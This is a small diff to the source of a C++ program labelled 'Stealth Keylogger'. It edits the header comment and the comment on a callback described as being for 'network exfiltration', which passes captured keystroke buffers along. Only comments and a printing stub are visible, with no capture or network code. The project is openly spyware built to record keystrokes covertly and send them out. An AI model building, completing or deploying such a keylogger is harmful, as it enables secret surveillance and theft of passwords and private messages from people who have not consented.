@@ -1,5 +1,6 @@
 /*
- * Stealth Keylogger - Production-ready keyboard monitoring tool
+ * Stealth Keylogger
+ *
  * Copyright (c) 2025 - 28zaakypro@proton.me
  * 
  * Features:
@@ -23,7 +24,7 @@ using namespace std;
 // Global flag for clean exit
 bool g_running = true;
 
-// Optional: Callback function for network exfiltration
+// Callback function for network exfiltration
 void KeystrokeCallback(const wstring& data) {
     wcout << L"\n[CALLBACK] Captured keystroke buffer:\n" << data << endl;
     
